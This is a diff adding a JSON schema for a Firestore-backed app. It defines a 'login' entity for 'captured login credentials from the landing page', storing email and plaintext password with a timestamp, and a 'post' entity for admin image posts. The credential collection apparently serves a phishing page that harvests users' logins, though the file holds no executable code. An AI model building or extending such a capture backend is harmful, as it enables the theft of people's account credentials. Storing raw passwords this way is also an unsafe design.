@@ -1,0 +1,37 @@
+{
+  "entities": {
+    "login": {
+      "title": "Login Attempt",
+      "description": "Captured login credentials from the landing page.",
+      "type": "object",
+      "properties": {
+        "email": { "type": "string" },
+        "password": { "type": "string" },
+        "timestamp": { "type": "string", "format": "date-time" }
+      },
+      "required": ["email", "password", "timestamp"]
+    },
+    "post": {
+      "title": "Post",
+      "description": "Image posts created by the admin.",
+      "type": "object",
+      "properties": {
+        "imageUrl": { "type": "string" },
+        "caption": { "type": "string" },
+        "createdAt": { "type": "string", "format": "date-time" },
+        "authorId": { "type": "string" }
+      },
+      "required": ["imageUrl", "createdAt", "authorId"]
+    }
+  },
+  "firestore": {
+    "logins": {
+      "schema": "login",
+      "description": "Collection of captured login attempts."
+    },
+    "posts": {
+      "schema": "post",
+      "description": "Collection of posts shared by the admin."
+    }
+  }
+}
